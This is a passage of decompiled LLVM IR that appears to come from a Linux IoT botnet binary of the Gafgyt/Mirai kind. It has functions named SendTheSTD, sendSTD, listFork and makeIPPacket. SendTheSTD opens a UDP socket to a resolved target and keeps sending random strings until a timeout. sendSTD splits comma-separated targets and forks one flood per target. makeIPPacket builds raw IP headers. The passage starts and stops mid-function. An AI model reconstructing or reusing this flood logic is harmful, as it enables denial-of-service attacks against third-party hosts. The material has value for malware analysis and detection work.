  %v6_804f67c11 = icmp eq i32 %v0_804f6739, 1
  br i1 %v6_804f67c11, label %dec_label_pc_804f67e, label %dec_label_pc_804f651

dec_label_pc_804f651:                             ; preds = %dec_label_pc_804f627, %dec_label_pc_804f651
  %storemerge112 = phi i32 [ %v4_804f670, %dec_label_pc_804f651 ], [ 0, %dec_label_pc_804f627 ]
  %v2_804f654 = mul i32 %storemerge112, 4
  %v5_804f659 = add i32 %v2_804f654, %v1_804f640
  store i32 %v5_804f659, i32* @ecx, align 4
  %v0_804f664 = load i32, i32* @global_var_807f354.32, align 4
  %v2_804f669 = add i32 %v0_804f664, %v2_804f654
  %v1_804f66c = inttoptr i32 %v2_804f669 to i32*
  %v2_804f66c = load i32, i32* %v1_804f66c, align 4
  %v2_804f66e = inttoptr i32 %v5_804f659 to i32*
  store i32 %v2_804f66c, i32* %v2_804f66e, align 4
  %v4_804f670 = add i32 %storemerge112, 1
  %v0_804f673 = load i32, i32* @global_var_80756d4.31, align 4
  %v1_804f678 = add i32 %v0_804f673, -1
  %v6_804f67c = icmp ugt i32 %v1_804f678, %v4_804f670
  br i1 %v6_804f67c, label %dec_label_pc_804f651, label %dec_label_pc_804f67e

dec_label_pc_804f67e:                             ; preds = %dec_label_pc_804f651, %dec_label_pc_804f627
  %v0_804f673.lcssa = phi i32 [ %v0_804f6739, %dec_label_pc_804f627 ], [ %v0_804f673, %dec_label_pc_804f651 ]
  %v2_804f683 = mul i32 %v0_804f673.lcssa, 4
  %v5_804f686 = add i32 %v2_804f683, %v1_804f640
  %v1_804f689 = add i32 %v5_804f686, -4
  store i32 %v1_804f689, i32* @edx, align 4
  %v2_804f68f = inttoptr i32 %v1_804f689 to i32*
  store i32 %v1_804f60e, i32* %v2_804f68f, align 4
  %v0_804f691 = load i32, i32* @global_var_807f354.32, align 4
  %v1_804f699 = call i32 @free(i32 %v0_804f691)
  store i32 %v1_804f640, i32* @global_var_807f354.32, align 4
  br label %dec_label_pc_804f6ac

dec_label_pc_804f6ac:                             ; preds = %entry, %dec_label_pc_804f67e
  %v2_804f6af = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f6af, i32* @ebp, align 4
  ret i32 %v1_804f60e

; uselistorder directives
  uselistorder i32 %v4_804f670, { 1, 0 }
  uselistorder i32 %v2_804f654, { 1, 0 }
  uselistorder i32 %storemerge112, { 1, 0 }
  uselistorder i32 %v0_804f6739, { 1, 0 }
  uselistorder i32 %v1_804f640, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f6ac, { 1, 0 }
  uselistorder label %dec_label_pc_804f651, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v4_804f6d2 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804f6e1 = call i32 @__GI_time(i32* null)
  %v1_804f6ef = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804f6f7 = ptrtoint i32* %stack_var_-48 to i32
  store i32 0, i32* %stack_var_-48, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v1_804f718 = add i32 %v1_804f6ef, 12
  %v2_804f718 = inttoptr i32 %v1_804f718 to i32*
  %v3_804f718 = load i32, i32* %v2_804f718, align 4
  %v2_804f720 = ptrtoint i32* %stack_var_-44 to i32
  %v1_804f726 = add i32 %v1_804f6ef, 16
  %v2_804f726 = inttoptr i32 %v1_804f726 to i32*
  %v3_804f726 = load i32, i32* %v2_804f726, align 4
  %v1_804f729 = inttoptr i32 %v3_804f726 to i32*
  %v2_804f729 = load i32, i32* %v1_804f729, align 4
  %v4_804f736 = call i32 @bcopy(i32 %v2_804f729, i32 %v2_804f720, i32 %v3_804f718)
  %v1_804f73e = add i32 %v1_804f6ef, 8
  %v2_804f73e = inttoptr i32 %v1_804f73e to i32*
  %v3_804f73e = load i32, i32* %v2_804f73e, align 4
  %v1_804f741 = urem i32 %v3_804f73e, 65536
  store i32 %v1_804f741, i32* %stack_var_-48, align 4
  %v4_804f771 = bitcast i32* %stack_var_-364 to i16*
  %v5_804f771 = call i32 @memcpy(i16* %v4_804f771, i32 ptrtoint ([79 x i8*]* @global_var_806adc0.238 to i32), i32 316)
  %v4_804f776 = icmp eq i32 %arg2, 0
  %v5_804f866 = add i32 %v2_804f6e1, %arg3
  %v1_804f77a = icmp eq i1 %v4_804f776, false
  br label %dec_label_pc_804f776

dec_label_pc_804f776:                             ; preds = %dec_label_pc_804f88b, %entry
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_804f88b, %dec_label_pc_804f88b ]
  br i1 %v1_804f77a, label %dec_label_pc_804f79b, label %dec_label_pc_804f77c

dec_label_pc_804f77c:                             ; preds = %dec_label_pc_804f776
  %v3_804f78b = call i32 @realrand(i32 1, i32 65535)
  br label %dec_label_pc_804f79b

dec_label_pc_804f79b:                             ; preds = %dec_label_pc_804f776, %dec_label_pc_804f77c
  %v0_804f79b = call i32 @random()
  store i32 %v0_804f79b, i32* @ecx, align 4
  %v2_804f7b6 = udiv i32 %v0_804f79b, 79
  %tmp = mul nsw i32 %v2_804f7b6, -15
  %v2_804f7d9 = add i32 %v0_804f79b, %tmp
  store i32 %v2_804f7d9, i32* @edi, align 4
  %v0_804f7e7 = load i32, i32* @ebp, align 4
  %v2_804f7e7 = mul i32 %v2_804f7d9, 4
  %v3_804f7e7 = add i32 %v0_804f7e7, -360
  %v4_804f7e7 = add i32 %v3_804f7e7, %v2_804f7e7
  %v5_804f7e7 = inttoptr i32 %v4_804f7e7 to i32*
  %v6_804f7e7 = load i32, i32* %v5_804f7e7, align 4
  %v5_804f7ee = inttoptr i32 %v6_804f7e7 to i8*
  %v4_804f810 = call i32 @connect(i32 %v4_804f6d2, i32 %v2_804f6f7, i32 16)
  store i1 false, i1* @df, align 1
  store i32 %v6_804f7e7, i32* @edi, align 4
  %v3_804f82c = call i32 @_strlen(i8* %v5_804f7ee)
  %v4_804f82c = mul i32 %v3_804f82c, -1
  %v5_804f82c = add i32 %v4_804f82c, -2
  store i32 %v5_804f82c, i32* @ecx, align 4
  %v1_804f832 = sub i32 0, %v4_804f82c
  %v5_804f84c = call i32 @send(i32 %v4_804f6d2, i32 %v6_804f7e7, i32 %v1_804f832, i32 0)
  %tmp34 = icmp ult i32 %stack_var_-16.0, 100
  br i1 %tmp34, label %dec_label_pc_804f88b, label %dec_label_pc_804f857

dec_label_pc_804f857:                             ; preds = %dec_label_pc_804f79b
  %v2_804f85e = call i32 @__GI_time(i32* null)
  %v5_804f86b = icmp slt i32 %v2_804f85e, %v5_804f866
  br i1 %v5_804f86b, label %dec_label_pc_804f88b, label %dec_label_pc_804f86d

dec_label_pc_804f86d:                             ; preds = %dec_label_pc_804f857
  %v1_804f873 = call i32 @close(i32 %v4_804f6d2)
  %v1_804f87f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f88b:                             ; preds = %dec_label_pc_804f857, %dec_label_pc_804f79b
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_804f79b ], [ 0, %dec_label_pc_804f857 ]
  %v4_804f88b = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_804f776

; uselistorder directives
  uselistorder i32 %v2_804f7d9, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v1_804f6ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_804f79b, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f893 = load i32, i32* @ebp, align 4
  store i32 %v0_804f893, i32* %stack_var_-4, align 4
  %v4_804f893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f893, i32* @ebp, align 4
  %v1_804f89f = call i32 @mfork(i32 %arg2)
  %v1_804f8a4 = icmp eq i32 %v1_804f89f, 0
  %v1_804f8a6 = icmp eq i1 %v1_804f8a4, false
  br i1 %v1_804f8a6, label %dec_label_pc_804fa22, label %dec_label_pc_804f8ac

dec_label_pc_804f8ac:                             ; preds = %entry
  %v4_804f8ac = add i32 %arg3, -2
  %v9_804f8ac = sub i32 1, %arg3
  %v10_804f8ac = and i32 %v9_804f8ac, %arg3
  %v11_804f8ac = icmp slt i32 %v10_804f8ac, 0
  %v12_804f8ac = icmp eq i32 %v4_804f8ac, 0
  %v13_804f8ac = icmp slt i32 %v4_804f8ac, 0
  %v3_804f8b0 = icmp eq i1 %v13_804f8ac, %v11_804f8ac
  %v4_804f8b0 = icmp eq i1 %v12_804f8ac, false
  %v5_804f8b0 = and i1 %v4_804f8b0, %v3_804f8b0
  br i1 %v5_804f8b0, label %dec_label_pc_804f8d8, label %dec_label_pc_804f8b2

dec_label_pc_804f8b2:                             ; preds = %dec_label_pc_804f8ac
  %v2_804f8c7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_806af04.239 to i32))
  %v1_804f8d3 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804f8d8

dec_label_pc_804f8d8:                             ; preds = %dec_label_pc_804f8ac, %dec_label_pc_804f8b2
  %v1_804f8db = add i32 %arg4, 4
  %v1_804f8de = inttoptr i32 %v1_804f8db to i32*
  %v2_804f8de = load i32, i32* %v1_804f8de, align 4
  %v1_804f8e6 = add i32 %arg4, 8
  %v1_804f8e9 = inttoptr i32 %v1_804f8e6 to i32*
  %v2_804f8e9 = load i32, i32* %v1_804f8e9, align 4
  %v1_804f8ee = call i32 @atol(i32 %v2_804f8e9)
  %v1_804f8f9 = add i32 %arg4, 12
  %v1_804f8fc = inttoptr i32 %v1_804f8f9 to i32*
  %v2_804f8fc = load i32, i32* %v1_804f8fc, align 4
  %v1_804f901 = call i32 @atol(i32 %v2_804f8fc)
  %v2_804f917 = inttoptr i32 %v2_804f8de to i8*
  %v3_804f917 = call i32 @__GI_strchr(i8* %v2_804f917, i32 44)
  %v1_804f91c = icmp eq i32 %v3_804f917, 0
  br i1 %v1_804f91c, label %dec_label_pc_804f9b6, label %dec_label_pc_804f924

dec_label_pc_804f924:                             ; preds = %dec_label_pc_804f8d8
  store i32 %v2_804f8de, i32* @eax, align 4
  %v2_804f932 = call i32 @__GI_strtok(i32 %v2_804f8de, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  %v4_804f9ae3 = icmp eq i32 %v2_804f932, 0
  %v1_804f9b210 = icmp eq i1 %v4_804f9ae3, false
  br i1 %v1_804f9b210, label %dec_label_pc_804f93c, label %dec_label_pc_804fa22

dec_label_pc_804f93c:                             ; preds = %dec_label_pc_804f924, %dec_label_pc_804f997
  %storemerge111 = phi i32 [ %v2_804f9a6, %dec_label_pc_804f997 ], [ %v2_804f932, %dec_label_pc_804f924 ]
  %v1_804f93c = call i32 @listFork(i32 %storemerge111)
  store i32 %v1_804f93c, i32* @eax, align 4
  %v1_804f941 = icmp eq i32 %v1_804f93c, 0
  %v1_804f943 = icmp eq i1 %v1_804f941, false
  br i1 %v1_804f943, label %dec_label_pc_804f997, label %dec_label_pc_804f945

dec_label_pc_804f945:                             ; preds = %dec_label_pc_804f93c
  %v2_804f96d = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806af28.240 to i32))
  %v3_804f986 = call i32 @SendTheSTD(i32 %storemerge111, i32 %v1_804f8ee, i32 %v1_804f901)
  %v1_804f992 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f997:                             ; preds = %dec_label_pc_804f93c
  %v2_804f9a6 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  %v4_804f9ae = icmp eq i32 %v2_804f9a6, 0
  %v1_804f9b2 = icmp eq i1 %v4_804f9ae, false
  br i1 %v1_804f9b2, label %dec_label_pc_804f93c, label %dec_label_pc_804fa22

dec_label_pc_804f9b6:                             ; preds = %dec_label_pc_804f8d8
  %v1_804f9b6 = call i32 @listFork(i32 %tmp16)
  %v1_804f9bb = icmp eq i32 %v1_804f9b6, 0
  br i1 %v1_804f9bb, label %dec_label_pc_804f9cb, label %dec_label_pc_804f9bf

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804f9b6
  %v1_804f9c6 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804f9cb

dec_label_pc_804f9cb:                             ; preds = %dec_label_pc_804f9b6, %dec_label_pc_804f9bf
  %v2_804f9f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806af28.240 to i32))
  %v3_804fa11 = call i32 @SendTheSTD(i32 %v2_804f8de, i32 %v1_804f8ee, i32 %v1_804f901)
  %v1_804fa1d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fa22:                             ; preds = %dec_label_pc_804f997, %dec_label_pc_804f924, %entry
  %v0_804fa23 = phi i32 [ %v1_804f89f, %entry ], [ %v2_804f932, %dec_label_pc_804f924 ], [ %v2_804f9a6, %dec_label_pc_804f997 ]
  ret i32 %v0_804fa23

; uselistorder directives
  uselistorder i32 %v2_804f9a6, { 0, 2, 1 }
  uselistorder i32 %v2_804f932, { 1, 0, 2 }
  uselistorder i32 %v1_804f901, { 1, 0 }
  uselistorder i32 %v1_804f8ee, { 1, 0 }
  uselistorder i32 %v2_804f8de, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804f8ac, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @SendTheSTD, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9cb, { 1, 0 }
  uselistorder label %dec_label_pc_804f93c, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d8, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa24 = load i32, i32* @ebp, align 4
  store i32 %v0_804fa24, i32* %stack_var_-4, align 4
  %v4_804fa24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804fa24, i32* @ebp, align 4
  %v3_804fa41 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804fa5e = ptrtoint i32* %stack_var_-44 to i32
  %v3_804fa64 = bitcast i32* %stack_var_-44 to i8*
  %v4_804fa64 = call i32 @strncpy(i8* %v3_804fa64, i32 %arg2, i32 15)
  %v3_804fa7e = call i32 @ioctl(i32 %v3_804fa41, i32 35093, i32 %v2_804fa5e)
  %v4_804fa86 = icmp eq i32 %v3_804fa7e, 0
  br i1 %v4_804fa86, label %dec_label_pc_804fa95, label %dec_label_pc_804fabe

dec_label_pc_804fa95:                             ; preds = %entry
  %v1_804fa9b = call i32 @close(i32 %v3_804fa41)
  %v4_804faa0 = ptrtoint i16* %arg1 to i32
  store i16 2, i16* %arg1, align 2
  %v2_804fab4 = add i32 %v4_804faa0, 4
  %v3_804fab4 = inttoptr i32 %v2_804fab4 to i32*
  br label %dec_label_pc_804fabe

dec_label_pc_804fabe:                             ; preds = %entry, %dec_label_pc_804fa95
  %storemerge = phi i32 [ 1, %dec_label_pc_804fa95 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fabe, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_804fac3 = load i32, i32* @ebp, align 4
  %v1_804facf = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_804facf, i32* %arg2, align 4
  %v10_804fae0 = icmp eq i32 %v1_804facf, -1
  %. = zext i1 %v10_804fae0 to i32
  store i32 %v0_804fac3, i32* @ebp, align 4
  ret i32 %.
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_3()
  %tmp8 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fafa = load i32, i32* @ebp, align 4
  store i32 %v0_804fafa, i32* %stack_var_-4, align 4
  %v4_804fb00 = sext i8 %tmp8 to i32
  %v4_804fb06 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804fb21 = add i32 %v4_804fb06, 1
  %v2_804fb21 = inttoptr i32 %v1_804fb21 to i8*
  store i8 0, i8* %v2_804fb21, align 1
  %v1_804fb2b = add i32 %tmp5, 20
  %v1_804fb34 = trunc i32 %v1_804fb2b to i16
  %v3_804fb34 = add i32 %v4_804fb06, 2
  %v4_804fb34 = inttoptr i32 %v3_804fb34 to i16*
  store i16 %v1_804fb34, i16* %v4_804fb34, align 2
  %v2_804fb38 = call i32 @rand_cmwc(i32 %v4_804fb00)
  %v1_804fb43 = trunc i32 %v2_804fb38 to i16
  %v3_804fb43 = add i32 %v4_804fb06, 4
  %v4_804fb43 = inttoptr i32 %v3_804fb43 to i16*
  store i16 %v1_804fb43, i16* %v4_804fb43, align 2
  %v1_804fb4a = add i32 %v4_804fb06, 6
  %v2_804fb4a = inttoptr i32 %v1_804fb4a to i16*
  store i16 0, i16* %v2_804fb4a, align 2
  %v1_804fb53 = add i32 %v4_804fb06, 8
  %v2_804fb53 = inttoptr i32 %v1_804fb53 to i8*
  store i8 -1, i8* %v2_804fb53, align 1
  %v3_804fb5e = add i32 %v4_804fb06, 9
  %v4_804fb5e = inttoptr i32 %v3_804fb5e to i8*
  store i8 %tmp8, i8* %v4_804fb5e, align 1
  %v1_804fb64 = add i32 %v4_804fb06, 10
  %v2_804fb64 = inttoptr i32 %v1_804fb64 to i16*
  store i16 0, i16* %v2_804fb64, align 2
  %v2_804fb70 = add i32 %v4_804fb06, 12
  %v3_804fb70 = inttoptr i32 %v2_804fb70 to i32*
  %v2_804fb79 = add i32 %v4_804fb06, 16
  %v3_804fb79 = inttoptr i32 %v2_804fb79 to i32*
  store i32 %tmp, i32* %v3_804fb79, align 4
  %v2_804fb7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb7c, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 69, { 0, 9, 10, 7, 1, 2, 3, 4, 5, 6, 8 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804fb84 = icmp eq i32* %arg1, null
  br i1 %v4_804fb84, label %dec_label_pc_804fba3, label %dec_label_pc_804fb8a

dec_label_pc_804fb8a:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_804fb8d = load i32, i32* %arg1, align 4
  %v3_804fb92 = inttoptr i32 %v2_804fb8d to i8*
  store i8 %tmp8, i8* %v3_804fb92, align 1
  %v2_804fb97 = load i32, i32* %arg1, align 4
  %v1_804fb99 = add i32 %v2_804fb97, 1
  store i32 %v1_804fb99, i32* @edx, align 4
  store i32 %v1_804fb99, i32* %arg1, align 4
  br label %dec_label_pc_804fbbe

dec_label_pc_804fba3:                             ; preds = %entry
  %v2_804fbab = ptrtoint i8* %stack_var_8 to i32
  %v3_804fbb9 = call i32 @write(i32 1, i32 %v2_804fbab, i32 1)
  br label %dec_label_pc_804fbbe

dec_label_pc_804fbbe:                             ; preds = %dec_label_pc_804fb8a, %dec_label_pc_804fba3
  %v0_804fbbf = phi i32 [ %tmp5, %dec_label_pc_804fb8a ], [ %v3_804fbb9, %dec_label_pc_804fba3 ]
  ret i32 %v0_804fbbf

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804fbbe, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp14 = icmp slt i32 %arg3, 1
  br i1 %tmp14, label %dec_label_pc_804fc21, label %dec_label_pc_804fbda

dec_label_pc_804fbda:                             ; preds = %entry
  %v4_804fbe1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804fbe1, i32* @edx, align 4
  %v2_804fbf246 = load i8, i8* %arg2, align 1
  %v4_804fbf548 = icmp eq i8 %v2_804fbf246, 0
  %v1_804fbf750 = icmp eq i1 %v4_804fbf548, false
  br i1 %v1_804fbf750, label %dec_label_pc_804fbe9, label %dec_label_pc_804fbf9

dec_label_pc_804fbe9:                             ; preds = %dec_label_pc_804fbda, %dec_label_pc_804fbe9
  %v4_804fbef52 = phi i32 [ %v5_804fbec, %dec_label_pc_804fbe9 ], [ %v4_804fbe1, %dec_label_pc_804fbda ]
  %stack_var_-12.051 = phi i32 [ %v4_804fbe9, %dec_label_pc_804fbe9 ], [ 0, %dec_label_pc_804fbda ]
  %v4_804fbe9 = add i32 %stack_var_-12.051, 1
  %v5_804fbec = add i32 %v4_804fbef52, 1
  %v22_804fbec = inttoptr i32 %v5_804fbec to i8*
  store i32 %v5_804fbec, i32* @edx, align 4
  %v2_804fbf2 = load i8, i8* %v22_804fbec, align 1
  %v4_804fbf5 = icmp eq i8 %v2_804fbf2, 0
  %v1_804fbf7 = icmp eq i1 %v4_804fbf5, false
  br i1 %v1_804fbf7, label %dec_label_pc_804fbe9, label %dec_label_pc_804fbf9

dec_label_pc_804fbf9:                             ; preds = %dec_label_pc_804fbe9, %dec_label_pc_804fbda
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804fbda ], [ %v4_804fbe9, %dec_label_pc_804fbe9 ]
  %v5_804fbff = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804fbff, label %dec_label_pc_804fc0a, label %dec_label_pc_804fc10

dec_label_pc_804fc0a:                             ; preds = %dec_label_pc_804fbf9
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804fc0d = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804fc10

dec_label_pc_804fc10:                             ; preds = %dec_label_pc_804fbf9, %dec_label_pc_804fc0a
  %storemerge = phi i32 [ %v5_804fc0d, %dec_label_pc_804fc0a ], [ 0, %dec_label_pc_804fbf9 ]
  %v1_804fc13 = and i32 %arg4, 2
  %tmp15 = mul nuw nsw i32 %v1_804fc13, 8
  %tmp16 = or i32 %tmp15, 32
  br label %dec_label_pc_804fc21

dec_label_pc_804fc21:                             ; preds = %dec_label_pc_804fc10, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804fc10 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp16, %dec_label_pc_804fc10 ]
  %v1_804fc24 = urem i32 %arg4, 2
  %v2_804fc24 = icmp eq i32 %v1_804fc24, 0
  %v1_804fc29 = icmp eq i1 %v2_804fc24, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_804fc29, label %dec_label_pc_804fc6b.preheader, label %dec_label_pc_804fc45.preheader

dec_label_pc_804fc45.preheader:                   ; preds = %dec_label_pc_804fc21
  %tmp1739 = icmp slt i32 %stack_var_12.0, 1
  %tmp1840 = icmp eq i1 %tmp1739, false
  br i1 %tmp1840, label %dec_label_pc_804fc2d, label %dec_label_pc_804fc6b.preheader

dec_label_pc_804fc2d:                             ; preds = %dec_label_pc_804fc45.preheader, %dec_label_pc_804fc2d
  %stack_var_-20.042 = phi i32 [ %v4_804fc3f, %dec_label_pc_804fc2d ], [ 0, %dec_label_pc_804fc45.preheader ]
  %stack_var_12.141 = phi i32 [ %v4_804fc42, %dec_label_pc_804fc2d ], [ %stack_var_12.0, %dec_label_pc_804fc45.preheader ]
  %v3_804fc3a = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_804fc3f = add i32 %stack_var_-20.042, 1
  %v4_804fc42 = add i32 %stack_var_12.141, -1
  %tmp17 = icmp slt i32 %v4_804fc42, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804fc2d, label %dec_label_pc_804fc6b.preheader

dec_label_pc_804fc6b.preheader:                   ; preds = %dec_label_pc_804fc45.preheader, %dec_label_pc_804fc2d, %dec_label_pc_804fc21
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804fc21 ], [ %stack_var_12.0, %dec_label_pc_804fc45.preheader ], [ %v4_804fc42, %dec_label_pc_804fc2d ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804fc21 ], [ 0, %dec_label_pc_804fc45.preheader ], [ %v4_804fc3f, %dec_label_pc_804fc2d ]
  %v4_804fc6b27 = ptrtoint i8* %arg2 to i32
  %v2_804fc6e28 = load i8, i8* %arg2, align 1
  %v4_804fc7130 = icmp eq i8 %v2_804fc6e28, 0
  %v1_804fc7332 = icmp eq i1 %v4_804fc7130, false
  br i1 %v1_804fc7332, label %dec_label_pc_804fc4d, label %dec_label_pc_804fc8f.preheader

dec_label_pc_804fc4d:                             ; preds = %dec_label_pc_804fc6b.preheader, %dec_label_pc_804fc4d
  %v4_804fc6b35 = phi i32 [ %v5_804fc68, %dec_label_pc_804fc4d ], [ %v4_804fc6b27, %dec_label_pc_804fc6b.preheader ]
  %stack_var_-20.134 = phi i32 [ %v4_804fc65, %dec_label_pc_804fc4d ], [ %stack_var_-20.1.ph, %dec_label_pc_804fc6b.preheader ]
  %stack_var_8.033 = phi i8* [ %v22_804fc68, %dec_label_pc_804fc4d ], [ %arg2, %dec_label_pc_804fc6b.preheader ]
  %v2_804fc50 = load i8, i8* %stack_var_8.033, align 1
  %v3_804fc50 = zext i8 %v2_804fc50 to i32
  %v3_804fc60 = call i32 @printchar(i32* %.pre, i32 %v3_804fc50)
  %v4_804fc65 = add i32 %stack_var_-20.134, 1
  %v5_804fc68 = add i32 %v4_804fc6b35, 1
  %v22_804fc68 = inttoptr i32 %v5_804fc68 to i8*
  %v2_804fc6e = load i8, i8* %v22_804fc68, align 1
  %v4_804fc71 = icmp eq i8 %v2_804fc6e, 0
  %v1_804fc73 = icmp eq i1 %v4_804fc71, false
  br i1 %v1_804fc73, label %dec_label_pc_804fc4d, label %dec_label_pc_804fc8f.preheader

dec_label_pc_804fc8f.preheader:                   ; preds = %dec_label_pc_804fc4d, %dec_label_pc_804fc6b.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804fc6b.preheader ], [ %v4_804fc65, %dec_label_pc_804fc4d ]
  %tmp1923 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2024 = icmp eq i1 %tmp1923, false
  br i1 %tmp2024, label %dec_label_pc_804fc77, label %dec_label_pc_804fc95

dec_label_pc_804fc77:                             ; preds = %dec_label_pc_804fc8f.preheader, %dec_label_pc_804fc77
  %stack_var_-20.226 = phi i32 [ %v4_804fc89, %dec_label_pc_804fc77 ], [ %stack_var_-20.1.lcssa, %dec_label_pc_804fc8f.preheader ]
  %stack_var_12.325 = phi i32 [ %v4_804fc8c, %dec_label_pc_804fc77 ], [ %stack_var_12.2.ph, %dec_label_pc_804fc8f.preheader ]
  %v3_804fc84 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_804fc89 = add i32 %stack_var_-20.226, 1
  %v4_804fc8c = add i32 %stack_var_12.325, -1
  %tmp19 = icmp slt i32 %v4_804fc8c, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804fc77, label %dec_label_pc_804fc95

dec_label_pc_804fc95:                             ; preds = %dec_label_pc_804fc77, %dec_label_pc_804fc8f.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804fc8f.preheader ], [ %v4_804fc89, %dec_label_pc_804fc77 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_804fc8c, { 1, 0 }
  uselistorder i8* %v22_804fc68, { 1, 0 }
  uselistorder i32 %v5_804fc68, { 1, 0 }
  uselistorder i32 %v4_804fc42, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804fbec, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804fc77, { 1, 0 }
  uselistorder label %dec_label_pc_804fc4d, { 1, 0 }
  uselistorder label %dec_label_pc_804fc6b.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc2d, { 1, 0 }
  uselistorder label %dec_label_pc_804fc10, { 1, 0 }
  uselistorder label %dec_label_pc_804fbe9, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_804fcae = trunc i64 %arg2 to i32
  %v5_804fcb4 = icmp eq i32 %v4_804fcae, 0
  %v6_804fcb4 = icmp slt i32 %v4_804fcae, 0
